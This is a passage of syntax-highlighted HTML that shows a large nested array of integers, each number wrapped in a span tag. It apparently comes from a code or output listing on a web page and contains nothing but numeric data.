class="number">1248</span>, <span class="number">1425</span>, <span class="number">405</span>, <span class="number">1726</span>, <span class="number">77</span>, <span class="number">726</span>, <span class="number">1070</span>, <span class="number">642</span>, <span class="number">935</span>, <span class="number">1105</span>], [<span class="number">1156</span>, <span class="number">765</span>, <span class="number">913</span>, <span class="number">323</span>, <span class="number">888</span>, <span class="number">727</span>, <span class="number">1826</span>, <span class="number">744</span>, <span class="number">54</span>, <span class="number">1009</span>, <span class="number">1790</span>, <span class="number">185</span>, <span class="number">1498</span>, <span class="number">1599</span>, <span class="number">1069</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">32</span>, <span class="number">1280</span>, <span class="number">274</span>, <span class="number">728</span>, <span class="number">1831</span>, <span class="number">1879</span>, <span class="number">175</span>, <span class="number">708</span>, <span class="number">1466</span>, <span class="number">589</span>, <span class="number">263</span>, <span class="number">707</span>, <span class="number">1542</span>, <span class="number">1790</span>, <span class="number">1816</span>, <span class="number">1854</span>, <span class="number">992</span>, <span class="number">1402</span>, <span class="number">1354</span>, <span class="number">1501</span>, <span class="number">1200</span>, <span class="number">1653</span>, <span class="number">1067</span>, <span class="number">1756</span>, <span class="number">573</span>], [<span class="number">645</span>, <span class="number">378</span>, <span class="number">356</span>, <span class="number">1474</span>, <span class="number">837</span>, <span class="number">1664</span>, <span class="number">45</span>, <span class="number">259</span>, <span class="number">289</span>, <span class="number">231</span>, <span class="number">1640</span>, <span class="number">244</span>, <span class="number">1864</span>, <span class="number">1022</span>, <span class="number">741</span>, <span class="number">1741</span>, <span class="number">1594</span>, <span class="number">1353</span>, <span class="number">991</span>, <span class="number">2002</span>, <span class="number">1969</span>, <span class="number">1522</span>, <span class="number">1852</span>, <span class="number">1031</span>, <span class="number">1296</span>, <span class="number">347</span>, <span class="number">1005</span>, <span class="number">1506</span>, <span class="number">760</span>, <span class="number">630</span>, <span class="number">462</span>, <span class="number">1302</span>, <span class="number">454</span>, <span class="number">466</span>, <span class="number">163</span>, <span class="number">488</span>, <span class="number">1239</span>, <span class="number">1554</span>, <span class="number">1482</span>, <span class="number">1918</span>, <span class="number">1394</span>, <span class="number">1244</span>], [<span class="number">199</span>, <span class="number">1336</span>, <span class="number">969</span>, <span class="number">526</span>, <span class="number">2009</span>, <span class="number">801</span>, <span class="number">1762</span>, <span class="number">1185</span>, <span class="number">645</span>, <span class="number">1577</span>, <span class="number">1303</span>, <span class="number">707</span>, <span class="number">1731</span>, <span class="number">1212</span>, <span class="number">341</span>, <span class="number">121</span>, <span class="number">1984</span>, <span class="number">1108</span>, <span class="number">1794</span>, <span class="number">1078</span>, <span class="number">404</span>, <span class="number">248</span>, <span class="number">36</span>, <span class="number">42</span>, <span class="number">1757</span>, <span class="number">1051</span>, <span class="number">1485</span>, <span class="number">1542</span>, <span class="number">442</span>, <span class="number">666</span>, <span class="number">1596</span>, <span class="number">335</span>, <span class="number">1527</span>, <span class="number">1707</span>, <span class="number">1035</span>, <span class="number">1924</span>, <span class="number">386</span>, <span class="number">1566</span>, <span class="number">1509</span>, <span class="number">998</span>, <span class="number">977</span>, <span class="number">328</span>], [<span class="number">1802</span>, <span class="number">1664</span>, <span class="number">1315</span>, <span class="number">607</span>, <span class="number">95</span>, <span class="number">477</span>, <span class="number">1534</span>, <span class="number">834</span>, <span class="number">1199</span>, <span class="number">1330</span>, <span class="number">738</span>, <span class="number">1339</span>, <span class="number">1313</span>, <span class="number">294</span>, <span class="number">1860</span>, <span class="number">1693</span>, <span class="number">2014</span>, <span class="number">1663</span>, <span class="number">549</span>, <span class="number">298</span>, <span class="number">1076</span>, <span class="number">618</span>, <span class="number">59</span>, <span class="number">749</span>, <span class="number">995</span>, <span class="number">1369</span>, <span class="number">558</span>, <span class="number">1703</span>, <span class="number">656</span>, <span class="number">1745</span>, <span class="number">1813</span>, <span class="number">1428</span>, <span class="number">612</span>, <span class="number">12</span>, <span class="number">624</span>, <span class="number">111</span>, <span class="number">850</span>, <span class="number">456</span>, <span class="number">596</span>, <span class="number">817</span>, <span class="number">383</span>, <span class="number">630</span>], [<span class="number">221</span>, <span class="number">207</span>, <span class="number">1253</span>, <span class="number">1353</span>, <span class="number">992</span>, <span class="number">1732</span>, <span class="number">1038</span>, <span class="number">325</span>, <span class="number">1696</span>, <span class="number">662</span>, <span class="number">771</span>, <span class="number">1437</span>, <span class="number">1616</span>, <span class="number">396</span>, <span class="number">1568</span>, <span class="number">476</span>, <span class="number">232</span>, <span class="number">220</span>, <span class="number">1945</span>, <span class="number">1500</span>, <span class="number">1865</span>, <span class="number">1477</span>, <span class="number">1540</span>, <span class="number">1608</span>, <span class="number">823</span>, <span class="number">255</span>, <span class="number">342</span>, <span class="number">1912</span>, <span class="number">733</span>, <span class="number">1450</span>, <span class="number">1600</span>, <span class="number">1838</span>, <span class="number">69</span>, <span class="number">32</span>, <span class="number">1392</span>, <span class="number">1647</span>, <span class="number">820</span>, <span class="number">492</span>, <span class="number">1479</span>, <span class="number">1172</span>, <span class="number">993</span>, <span class="number">1412</span>], [<span class="number">1207</span>, <span class="number">930</span>, <span class="number">69</span>, <span class="number">289</span>, <span class="number">1770</span>, <span class="number">162</span>, <span class="number">1442</span>, <span class="number">1071</span>, <span class="number">1598</span>, <span class="number">1900</span>, <span class="number">1409</span>, <span class="number">433</span>, <span class="number">1248</span>, <span class="number">1668</span>, <span class="number">314</span>, <span class="number">1201</span>, <span class="number">425</span>, <span class="number">334</span>, <span class="number">1373</span>, <span class="number">789</span>, <span class="number">975</span>, <span class="number">177</span>, <span class="number">1526</span>, <span class="number">49</span>, <span class="number">29</span>, <span class="number">174</span>, <span class="number">885</span>, <span class="number">264</span>, <span class="number">437</span>, <span class="number">287</span>, <span class="number">167</span>, <span class="number">1332</span>, <span class="number">1870</span>, <span class="number">1330</span>, <span class="number">1789</span>, <span class="number">372</span>, <span class="number">140</span>, <span class="number">1697</span>, <span class="number">1018</span>, <span class="number">642</span>, <span class="number">1894</span>, <span class="number">1829</span>], [<span class="number">1710</span>, <span class="number">1301</span>, <span class="number">511</span>, <span class="number">1837</span>, <span class="number">116</span>, <span class="number">1749</span>, <span class="number">1727</span>, <span class="number">1479</span>, <span class="number">950</span>, <span class="number">951</span>, <span class="number">1104</span>, <span class="number">866</span>, <span class="number">838</span>, <span class="number">1248</span>, <span class="number">911</span>, <span class="number">988</span>, <span class="number">1275</span>, <span class="number">637</span>, <span class="number">1636</span>, <span class="number">250</span>, <span class="number">1603</span>, <span class="number">1783</span>, <span class="number">1821</span>, <span class="number">149</span>, <span class="number">388</span>, <span class="number">1474</span>, <span class="number">1366</span>, <span class="number">1788</span>, <span class="number">1038</span>, <span class="number">4</span>, <span class="number">201</span>, <span class="number">1003</span>, <span class="number">1246</span>, <span class="number">1914</span>, <span class="number">233</span>, <span class="number">1625</span>, <span class="number">1041</span>, <span class="number">1979</span>, <span class="number">649</span>, <span class="number">665</span>, <span class="number">1381</span>, <span class="number">1522</span>], [<span class="number">855</span>, <span class="number">35</span>, <span class="number">317</span>, <span class="number">97</span>, <span class="number">400</span>, <span class="number">800</span>, <span class="number">107</span>, <span class="number">91</span>, <span class="number">1444</span>, <span class="number">1063</span>, <span class="number">552</span>, <span class="number">1363</span>, <span class="number">600</span>, <span class="number">767</span>, <span class="number">1313</span>, <span class="number">1117</span>, <span class="number">769</span>, <span class="number">541</span>, <span class="number">1466</span>, <span class="number">848</span>, <span class="number">935</span>, <span class="number">1918</span>, <span class="number">555</span>, <span class="number">1218</span>, <span class="number">1750</span>, <span class="number">1953</span>, <span class="number">1103</span>, <span class="number">1969</span>, <span class="number">1289</span>, <span class="number">634</span>, <span class="number">1310</span>, <span class="number">182</span>, <span class="number">1071</span>, <span class="number">1959</span>, <span class="number">544</span>, <span class="number">462</span>, <span class="number">377</span>, <span class="number">1696</span>, <span class="number">1597</span>, <span class="number">1936</span>, <span class="number">1285</span>, <span class="number">367</span>], [<span class="number">598</span>, <span class="number">1990</span>, <span class="number">750</span>, <span class="number">584</span>, <span class="number">227</span>, <span class="number">1392</span>, <span class="number">1493</span>, <span class="number">748</span>, <span class="number">1671</span>, <span class="number">224</span>, <span class="number">1360</span>, <span class="number">1094</span>, <span class="number">1994</span>, <span class="number">1792</span>, <span class="number">1140</span>, <span class="number">779</span>, <span class="number">1939</span>, <span class="number">361</span>, <span class="number">289</span>, <span class="number">1235</span>, <span class="number">213</span>, <span class="number">517</span>, <span class="number">1485</span>, <span class="number">1390</span>, <span class="number">804</span>, <span class="number">132</span>, <span class="number">920</span>, <span class="number">536</span>, <span class="number">1235</span>, <span class="number">837</span>, <span class="number">298</span>, <span class="number">1139</span>, <span class="number">961</span>, <span class="number">1521</span>, <span class="number">431</span>, <span class="number">76</span>, <span class="number">2019</span>, <span class="number">884</span>, <span class="number">1991</span>, <span class="number">522</span>, <span class="number">342</span>, <span class="number">1609</span>], [<span class="number">114</span>, <span class="number">1608</span>, <span class="number">1127</span>, <span class="number">722</span>, <span class="number">97</span>, <span class="number">140</span>, <span class="number">218</span>, <span class="number">617</span>, <span class="number">475</span>, <span class="number">1680</span>, <span class="number">214</span>, <span class="number">1595</span>, <span class="number">1373</span>, <span class="number">2021</span>, <span class="number">1031</span>, <span class="number">1243</span>, <span class="number">1526</span>, <span class="number">1562</span>, <span class="number">134</span>, <span class="number">684</span>, <span class="number">1178</span>, <span class="number">951</span>, <span class="number">1470</span>, <span class="number">1293</span>, <span class="number">1562</span>, <span class="number">744</span>, <span class="number">424</span>, <span class="number">336</span>, <span class="number">932</span>, <span class="number">897</span>, <span class="number">42</span>, <span class="number">1968</span>, <span class="number">1144</span>, <span class="number">195</span>, <span class="number">686</span>, <span class="number">46</span>, <span class="number">1032</span>, <span class="number">230</span>, <span class="number">1285</span>, <span class="number">132</span>, <span class="number">1514</span>, <span class="number">169</span>], [<span class="number">1870</span>, <span class="number">622</span>, <span class="number">830</span>, <span class="number">283</span>, <span class="number">713</span>, <span class="number">1893</span>, <span class="number">270</span>, <span class="number">573</span>, <span class="number">732</span>, <span class="number">1233</span>, <span class="number">246</span>, <span class="number">1408</span>, <span class="number">1890</span>, <span class="number">119</span>, <span class="number">1529</span>, <span class="number">396</span>, <span class="number">1522</span>, <span class="number">486</span>, <span class="number">1371</span>, <span class="number">211</span>, <span class="number">1196</span>, <span class="number">671</span>, <span class="number">200</span>, <span class="number">1390</span>, <span class="number">1790</span>, <span class="number">547</span>, <span class="number">567</span>, <span class="number">1315</span>, <span class="number">1782</span>, <span class="number">1661</span>, <span class="number">756</span>, <span class="number">6</span>, <span class="number">1864</span>, <span class="number">626</span>, <span class="number">1318</span>, <span class="number">694</span>, <span class="number">1632</span>, <span class="number">1177</span>, <span class="number">1128</span>, <span class="number">1327</span>, <span class="number">405</span>, <span class="number">1283</span>], [<span class="number">1714</span>, <span class="number">277</span>, <span class="number">1154</span>, <span class="number">369</span>, <span class="number">1472</span>, <span class="number">417</span>, <span class="number">541</span>, <span class="number">1244</span>, <span class="number">638</span>, <span class="number">1332</span>, <span class="number">512</span>, <span class="number">492</span>, <span class="number">1272</span>, <span class="number">929</span>, <span class="number">551</span>, <span class="number">34</span>, <span class="number">954</span>, <span class="number">362</span>, <span class="number">75</span>, <span class="number">1009</span>, <span class="number">725</span>, <span class="number">1481</span>, <span class="number">952</span>, <span class="number">1297</span>, <span class="number">1612</span>, <span class="number">289</span>, <span class="number">1684</span>, <span class="number">817</span>, <span class="number">112</span>, <span class="number">1731</span>, <span class="number">837</span>, <span class="number">1820</span>, <span class="number">1457</span>, <span class="number">1411</span>, <span class="number">1836</span>, <span class="number">454</span>, <span class="number">1984</span>, <span class="number">178</span>, <span class="number">46</span>, <span class="number">552</span>, <span class="number">282</span>, <span class="number">720</span>], [<span class="number">1602</span>, <span class="number">921</span>, <span class="number">919</span>, <span class="number">637</span>, <span class="number">25</span>, <span class="number">1052</span>, <span class="number">1246</span>, <span class="number">831</span>, <span class="number">1332</span>, <span class="number">1664</span>, <span class="number">260</span>, <span class="number">1387</span>, <span class="number">1660</span>, <span class="number">19</span>, <span class="number">839</span>, <span class="number">844</span>, <span class="number">1934</span>, <span class="number">1606</span>, <span class="number">970</span>, <span class="number">539</span>, <span class="number">992</span>, <span class="number">1401</span>, <span class="number">1804</span>, <span class="number">1879</span>, <span class="number">297</span>, <span class="number">1325</span>, <span class="number">1671</span>, <span class="number">128</span>, <span class="number">667</span>, <span class="number">1169</span>, <span class="number">808</span>, <span class="number">1238</span>, <span class="number">366</span>, <span class="number">1409</span>, <span class="number">1369</span>, <span class="number">1997</span>, <span class="number">1775</span>, <span class="number">1586</span>, <span class="number">746</span>, <span class="number">278</span>, <span class="number">1134</span>, <span class="number">464</span>], [<span class="number">1441</span>, <span class="number">1529</span>, <span class="number">415</span>, <span class="number">494</span>, <span class="number">1784</span>, <span class="number">1042</span>, <span class="number">799</span>, <span class="number">1701</span>, <span class="number">985</span>, <span class="number">404</span>, <span class="number">734</span>, <span class="number">1123</span>, <span class="number">1206</span>, <span class="number">1493</span>, <span class="number">1446</span>, <span class="number">562</span>, <span class="number">161</span>, <span class="number">1737</span>, <span class="number">1943</span>, <span class="number">753</span>, <span class="number">1782</span>, <span class="number">1341</span>, <span class="number">794</span>, <span class="number">333</span>, <span class="number">891</span>, <span class="number">973</span>, <span class="number">1656</span>, <span class="number">1995</span>, <span class="number">228</span>, <span class="number">523</span>, <span class="number">882</span>, <span class="number">228</span>, <span class="number">1010</span>, <span class="number">212</span>, <span class="number">262</span>, <span class="number">1948</span>, <span class="number">1573</span>, <span class="number">104</span>, <span class="number">767</span>, <span class="number">1607</span>, <span class="number">1333</span>, <span class="number">650</span>], [<span class="number">918</span>, <span class="number">1741</span>, <span class="number">1195</span>, <span class="number">247</span>, <span class="number">2001</span>, <span class="number">1290</span>, <span class="number">1640</span>, <span class="number">1655</span>, <span class="number">1209</span>, <span class="number">1171</span>, <span class="number">1686</span>, <span class="number">1565</span>, <span class="number">1347</span>, <span class="number">1245</span>, <span class="number">350</span>, <span class="number">1234</span>, <span class="number">1271</span>, <span class="number">724</span>, <span class="number">213</span>, <span class="number">1994</span>, <span class="number">974</span>, <span class="number">677</span>, <span class="number">415</span>, <span class="number">1728</span>, <span class="number">1465</span>, <span class="number">222</span>, <span class="number">425</span>, <span class="number">616</span>, <span class="number">1649</span>, <span class="number">1114</span>, <span class="number">285</span>, <span class="number">753</span>, <span class="number">593</span>, <span class="number">1795</span>, <span class="number">552</span>, <span class="number">192</span>, <span class="number">247</span>, <span class="number">1286</span>, <span class="number">1995</span>, <span class="number">304</span>, <span class="number">402</span>, <span class="number">240</span>], [<span class="number">1870</span>, <span class="number">843</span>, <span class="number">803</span>, <span class="number">905</span>, <span class="number">1256</span>, <span class="number">1668</span>, <span class="number">1850</span>, <span class="number">592</span>, <span class="number">1745</span>, <span class="number">1551</span>, <span class="number">957</span>, <span class="number">1095</span>, <span class="number">1492</span>, <span class="number">1413</span>, <span class="number">1604</span>, <span class="number">1944</span>, <span class="number">1424</span>, <span class="number">543</span>, <span class="number">169</span>, <span class="number">1811</span>, <span class="number">240</span>, <span class="number">996</span>, <span class="number">524</span>, <span class="number">556</span>, <span class="number">1189</span>, <span class="number">746</span>, <span class="number">1166</span>, <span class="number">157</span>, <span class="number">303</span>, <span class="number">965</span>, <span class="number">1848</span>, <span class="number">472</span>, <span class="number">1559</span>, <span class="number">419</span>, <span class="number">932</span>, <span class="number">2022</span>, <span class="number">966</span>, <span class="number">943</span>, <span class="number">1507</span>, <span class="number">1126</span>, <span class="number">1179</span>, <span class="number">1316</span>], [<span class="number">1984</span>, <span class="number">296</span>, <span class="number">1135</span>, <span class="number">779</span>, <span class="number">530</span>, <span class="number">1212</span>, <span class="number">1122</span>, <span class="number">113</span>, <span class="number">805</span>, <span class="number">108</span>, <span class="number">990</span>, <span class="number">897</span>, <span class="number">1372</span>, <span class="number">774</span>, <span class="number">940</span>, <span class="number">633</span>, <span class="number">999</span>, <span class="number">1113</span>, <span class="number">873</span>, <span class="number">1933</span>, <span class="number">233</span>, <span class="number">236</span>, <span class="number">1006</span>, <span class="number">1767</span>, <span class="number">1575</span>, <span class="number">736</span>, <span class="number">1530</span>, <span class="number">843</span>, <span class="number">1373</span>, <span class="number">526</span>, <span class="number">1863</span>, <span class="number">2022</span>, <span class="number">189</span>, <span class="number">291</span>, <span class="number">1746</span>, <span class="number">1804</span>, <span class="number">769</span>, <span class="number">1355</span>, <span class="number">1745</span>, <span class="number">1355</span>, <span class="number">368</span>, <span class="number">666</span>], [<span class="number">1714</span>, <span class="number">1278</span>, <span class="number">333</span>, <span class="number">2002</span>, <span class="number">379</span>, <span class="number">1788</span>, <span class="number">75</span>, <span class="number">174</span>, <span class="number">1369</span>, <span class="number">376</span>, <span class="number">1881</span>, <span class="number">553</span>, <span class="number">928</span>, <span class="number">1269</span>, <span class="number">1930</span>, <span class="number">622</span>, <span class="number">223</span>, <span class="number">278</span>, <span class="number">528</span>, <span class="number">1001</span>, <span class="number">918</span>, <span class="number">1018</span>, <span class="number">903</span>, <span class="number">1133</span>, <span class="number">420</span>, <span class="number">1389</span>, <span class="number">1796</span>, <span class="number">488</span>, <span class="number">410</span>, <span class="number">481</span>, <span class="number">1499</span>, <span class="number">228</span>, <span class="number">811</span>, <span class="number">1539</span>, <span class="number">91</span>, <span class="number">499</span>, <span class="number">1715</span>, <span class="number">249</span>, <span class="number">809</span>, <span class="number">1040</span>, <span class="number">1862</span>, <span class="number">1284</span>], [<span class="number">560</span>, <span class="number">156</span>, <span class="number">1508</span>, <span class="number">1302</span>, <span class="number">194</span>, <span class="number">1062</span>, <span class="number">49</span>, <span class="number">1000</span>, <span class="number">1670</span>, <span class="number">1094</span>, <span class="number">1565</span>, <span class="number">1982</span>, <span class="number">1848</span>, <span class="number">204</span>, <span class="number">1846</span>, <span class="number">1565</span>, <span class="number">186</span>, <span class="number">1701</span>, <span class="number">1233</span>, <span class="number">855</span>, <span class="number">555</span>, <span class="number">938</span>, <span class="number">1489</span>, <span class="number">945</span>, <span class="number">1205</span>, <span class="number">1036</span>, <span class="number">1093</span>, <span class="number">47</span>, <span class="number">416</span>, <span class="number">1832</span>, <span class="number">173</span>, <span class="number">801</span>, <span class="number">684</span>, <span class="number">10</span>, <span class="number">1729</span>, <span class="number">1931</span>, <span class="number">27</span>, <span class="number">461</span>, <span class="number">1619</span>, <span class="number">1468</span>, <span class="number">1069</span>, <span class="number">1455</span>], [<span class="number">270</span>, <span class="number">476</span>, <span class="number">948</span>, <span class="number">1474</span>, <span class="number">1209</span>, <span class="number">1968</span>, <span class="number">1193</span>, <span class="number">1683</span>, <span class="number">223</span>, <span class="number">1220</span>, <span class="number">730</span>, <span class="number">1122</span>, <span class="number">825</span>, <span class="number">1479</span>, <span class="number">922</span>, <span class="number">1684</span>, <span class="number">1526</span>, <span class="number">1532</span>, <span class="number">474</span>, <span class="number">1444</span>, <span class="number">1509</span>, <span class="number">1176</span>, <span class="number">1069</span>, <span class="number">1505</span>, <span class="number">1024</span>, <span class="number">1845</span>, <span class="number">1114</span>, <span class="number">762</span>, <span class="number">428</span>, <span class="number">893</span>, <span class="number">2012</span>, <span class="number">182</span>, <span class="number">1288</span>, <span class="number">851</span>, <span class="number">780</span>, <span class="number">228</span>, <span class="number">1393</span>, <span class="number">1834</span>, <span class="number">314</span>, <span class="number">402</span>, <span class="number">349</span>, <span class="number">189</span>], [<span class="number">1677</span>, <span class="number">1049</span>, <span class="number">606</span>, <span class="number">1404</span>, <span class="number">1606</span>, <span class="number">164</span>, <span class="number">251</span>, <span class="number">1134</span>, <span class="number">893</span>, <span class="number">834</span>, <span class="number">680</span>, <span class="number">1260</span>, <span class="number">1428</span>, <span class="number">1743</span>, <span class="number">1658</span>, <span class="number">298</span>, <span class="number">705</span>, <span class="number">1450</span>, <span class="number">1064</span>, <span class="number">207</span>, <span class="number">787</span>, <span class="number">1094</span>, <span class="number">545</span>, <span class="number">559</span>, <span class="number">131</span>, <span class="number">1110</span>, <span class="number">1402</span>, <span class="number">1671</span>, <span class="number">545</span>, <span class="number">1885</span>, <span class="number">241</span>, <span class="number">525</span>, <span class="number">1333</span>, <span class="number">268</span>, <span class="number">710</span>, <span class="number">1602</span>, <span class="number">925</span>, <span class="number">1713</span>, <span class="number">1390</span>, <span class="number">458</span>, <span class="number">292</span>, <span class="number">1982</span>], [<span class="number">1928</span>, <span class="number">173</span>, <span class="number">1894</span>, <span class="number">177</span>, <span class="number">1485</span>, <span class="number">2019</span>, <span class="number">1602</span>, <span class="number">1975</span>, <span class="number">1394</span>, <span class="number">813</span>, <span class="number">695</span>, <span class="number">998</span>, <span class="number">451</span>, <span class="number">859</span>, <span class="number">1913</span>, <span class="number">1307</span>, <span class="number">1200</span>, <span class="number">1900</span>, <span class="number">193</span>, <span class="number">1288</span>, <span class="number">509</span>, <span class="number">1568</span>, <span class="number">1664</span>, <span class="number">698</span>, <span class="number">1737</span>, <span class="number">1310</span>, <span class="number">1582</span>, <span class="number">634</span>, <span class="number">630</span>, <span class="number">1773</span>, <span class="number">315</span>, <span class="number">1225</span>, <span class="number">955</span>, <span class="number">195</span>, <span class="number">364</span>, <span class="number">1952</span>, <span class="number">1514</span>, <span class="number">107</span>, <span class="number">1103</span>, <span class="number">851</span>, <span class="number">194</span>, <span class="number">782</span>], [<span class="number">264</span>, <span class="number">1210</span>, <span class="number">1424</span>, <span class="number">774</span>, <span class="number">1867</span>, <span class="number">33</span>, <span class="number">1584</span>, <span class="number">76</span>, <span class="number">1170</span>, <span class="number">1217</span>, <span class="number">1404</span>, <span class="number">218</span>, <span class="number">419</span>, <span class="number">1478</span>, <span class="number">1780</span>, <span class="number">600</span>, <span class="number">480</span>, <span class="number">1559</span>, <span class="number">1687</span>, <span class="number">418</span>, <span class="number">963</span>, <span class="number">164</span>, <span class="number">1276</span>, <span class="number">1606</span>, <span class="number">1443</span>, <span class="number">1141</span>, <span class="number">461</span>, <span class="number">586</span>, <span class="number">378</span>, <span class="number">1949</span>, <span class="number">0</span>, <span class="number">224</span>, <span class="number">552</span>, <span class="number">1828</span>, <span class="number">904</span>, <span class="number">804</span>, <span class="number">1040</span>, <span class="number">938</span>, <span class="number">821</span>, <span class="number">2006</span>, <span class="number">109</span>, <span class="number">304</span>], [<span class="number">2005</span>, <span class="number">266</span>, <span class="number">213</span>, <span class="number">970</span>, <span class="number">1085</span>, <span class="number">1140</span>, <span class="number">1224</span>, <span class="number">1869</span>, <span class="number">554</span>, <span class="number">1495</span>, <span class="number">1256</span>, <span class="number">1662</span>, <span class="number">1671</span>, <span class="number">283</span>, <span class="number">281</span>, <span class="number">1432</span>, <span class="number">1107</span>, <span class="number">1460</span>, <span class="number">1535</span>, <span class="number">640</span>, <span class="number">755</span>, <span class="number">1295</span>, <span class="number">1764</span>, <span class="number">1638</span>, <span class="number">1929</span>, <span class="number">1592</span>, <span class="number">724</span>, <span class="number">1120</span>, <span class="number">1132</span>, <span class="number">728</span>, <span class="number">914</span>, <span class="number">930</span>, <span class="number">25</span>, <span class="number">1540</span>, <span class="number">689</span>, <span class="number">1661</span>, <span class="number">1814</span>, <span class="number">1974</span>, <span class="number">1594</span>, <span class="number">1634</span>, <span class="number">1954</span>, <span class="number">1322</span>], [<span class="number">1672</span>, <span class="number">888</span>, <span class="number">1165</span>, <span class="number">368</span>, <span class="number">1940</span>, <span class="number">1662</span>, <span class="number">525</span>, <span class="number">1544</span>, <span class="number">1080</span>, <span class="number">1406</span>, <span class="number">637</span>, <span class="number">415</span>, <span class="number">159</span>, <span class="number">634</span>, <span class="number">309</span>, <span class="number">533</span>, <span class="number">608</span>, <span class="number">1102</span>, <span class="number">1054</span>, <span class="number">1297</span>, <span class="number">1460</span>, <span class="number">471</span>, <span class="number">1199</span>, <span class="number">613</span>, <span class="number">334</span>, <span class="number">1351</span>, <span class="number">1244</span>, <span class="number">333</span>, <span class="number">290</span>, <span class="number">395</span>, <span class="number">829</span>, <span class="number">1531</span>, <span class="number">565</span>, <span class="number">1405</span>, <span class="number">418</span>, <span class="number">1490</span>, <span class="number">279</span>, <span class="number">1690</span>, <span class="number">1435</span>, <span class="number">460</span>, <span class="number">729</span>, <span class="number">139</span>], [<span class="number">49</span>, <span class="number">660</span>, <span class="number">1653</span>, <span class="number">4</span>, <span class="number">1984</span>, <span class="number">169</span>, <span class="number">1900</span>, <span class="number">437</span>, <span class="number">1182</span>, <span class="number">1834</span>, <span class="number">855</span>, <span class="number">335</span>, <span class="number">1494</span>, <span class="number">313</span>, <span class="number">1077</span>, <span class="number">776</span>, <span class="number">61</span>, <span class="number">1220</span>, <span class="number">593</span>, <span class="number">1938</span>, <span class="number">350</span>, <span class="number">1641</span>, <span class="number">295</span>, <span class="number">147</span>, <span class="number">335</span>, <span class="number">1894</span>, <span class="number">86</span>, <span class="number">639</span>, <span class="number">1958</span>, <span class="number">1730</span>, <span class="number">2021</span>, <span class="number">221</span>, <span class="number">1307</span>, <span class="number">1658</span>, <span class="number">103</span>, <span class="number">1697</span>, <span class="number">1900</span>, <span class="number">176</span>, <span class="number">1400</span>, <span class="number">1286</span>, <span class="number">271</span>, <span class="number">744</span>], [<span class="number">856</span>, <span class="number">299</span>, <span class="number">1704</span>, <span class="number">1169</span>, <span class="number">1947</span>, <span class="number">426</span>, <span class="number">2020</span>, <span class="number">518</span>, <span class="number">218</span>, <span class="number">437</span>, <span class="number">731</span>, <span class="number">705</span>, <span class="number">33</span>, <span class="number">455</span>, <span class="number">1382</span>, <span class="number">270</span>, <span class="number">1512</span>, <span class="number">1120</span>, <span class="number">1425</span>, <span class="number">1225</span>, <span class="number">1360</span>, <span class="number">1071</span>, <span class="number">1092</span>, <span class="number">896</span>, <span class="number">1296</span>, <span class="number">1062</span>, <span class="number">1264</span>, <span class="number">396</span>, <span class="number">855</span>, <span class="number">1537</span>, <span class="number">1879</span>, <span class="number">173</span>, <span class="number">1567</span>, <span class="number">1548</span>, <span class="number">228</span>, <span class="number">897</span>, <span class="number">1534</span>, <span class="number">323</span>, <span class="number">744</span>, <span class="number">1564</span>, <span class="number">950</span>, <span class="number">20</span>], [<span class="number">1309</span>, <span class="number">958</span>, <span class="number">2023</span>, <span class="number">811</span>, <span class="number">114</span>, <span class="number">1500</span>, <span class="number">77</span>, <span class="number">1031</span>, <span class="number">1204</span>, <span class="number">1811</span>, <span class="number">1178</span>, <span class="number">877</span>, <span class="number">1304</span>, <span class="number">308</span>, <span class="number">1898</span>, <span class="number">1763</span>, <span class="number">890</span>, <span class="number">1009</span>, <span class="number">631</span>, <span class="number">849</span>, <span class="number">1906</span>, <span class="number">376</span>, <span class="number">1214</span>, <span class="number">426</span>, <span class="number">171</span>, <span class="number">1096</span>, <span class="number">1157</span>, <span class="number">1704</span>, <span class="number">1060</span>, <span class="number">1332</span>, <span class="number">1811</span>, <span class="number">800</span>, <span class="number">712</span>, <span class="number">835</span>, <span class="number">169</span>, <span class="number">1598</span>, <span class="number">1948</span>, <span class="number">1384</span>, <span class="number">1143</span>, <span class="number">1209</span>, <span class="number">1431</span>, <span class="number">574</span>], [<span class="number">1324</span>, <span class="number">725</span>, <span class="number">652</span>, <span class="number">99</span>, <span class="number">1910</span>, <span class="number">522</span>, <span class="number">871</span>, <span class="number">1609</span>, <span class="number">756</span>, <span class="number">1763</span>, <span class="number">1230</span>, <span class="number">1931</span>, <span class="number">487</span>, <span class="number">624</span>, <span class="number">1036</span>, <span class="number">1506</span>, <span class="number">114</span>, <span class="number">575</span>, <span class="number">800</span>, <span class="number">1054</span>, <span class="number">1027</span>, <span class="number">1309</span>, <span class="number">1506</span>, <span class="number">417</span>, <span class="number">1517</span>, <span class="number">270</span>, <span class="number">1610</span>, <span class="number">614</span>, <span class="number">219</span>, <span class="number">1512</span>, <span class="number">882</span>, <span class="number">1457</span>, <span class="number">1798</span>, <span class="number">1262</span>, <span class="number">655</span>, <span class="number">1271</span>, <span class="number">1066</span>, <span class="number">827</span>, <span class="number">1767</span>, <span class="number">1754</span>, <span class="number">1054</span>, <span class="number">345</span>], [<span class="number">221</span>, <span class="number">1642</span>, <span class="number">258</span>, <span class="number">1504</span>, <span class="number">1569</span>, <span class="number">67</span>, <span class="number">57</span>, <span class="number">938</span>, <span class="number">1773</span>, <span class="number">218</span>, <span class="number">1635</span>, <span class="number">1514</span>, <span class="number">1038</span>, <span class="number">884</span>, <span class="number">1686</span>, <span class="number">508</span>, <span class="number">1050</span>, <span class="number">1104</span>, <span class="number">1121</span>, <span class="number">666</span>, <span class="number">887</span>, <span class="number">280</span>, <span class="number">1566</span>, <span class="number">384</span>, <span class="number">1328</span>, <span class="number">1336</span>, <span class="number">1906</span>, <span class="number">1477</span>, <span class="number">1969</span>, <span class="number">760</span>, <span class="number">447</span>, <span class="number">1887</span>, <span class="number">480</span>, <span class="number">92</span>, <span class="number">1959</span>, <span class="number">1917</span>, <span class="number">1132</span>, <span class="number">717</span>, <span class="number">741</span>, <span class="number">1876</span>, <span class="number">579</span>, <span class="number">132</span>], [<span class="number">596</span>, <span class="number">286</span>, <span class="number">1471</span>, <span class="number">1206</span>, <span class="number">1778</span>, <span class="number">1982</span>, <span class="number">835</span>, <span class="number">566</span>, <span class="number">1347</span>, <span class="number">1842</span>, <span class="number">200</span>, <span class="number">675</span>, <span class="number">1659</span>, <span class="number">278</span>, <span class="number">1166</span>, <span class="number">172</span>, <span class="number">1985</span>, <span class="number">316</span>, <span class="number">724</span>, <span class="number">419</span>, <span class="number">1210</span>, <span class="number">800</span>, <span class="number">1637</span>, <span class="number">337</span>, <span class="number">218</span>, <span class="number">2020</span>, <span class="number">1207</span>, <span class="number">1992</span>, <span class="number">1339</span>, <span class="number">1096</span>, <span 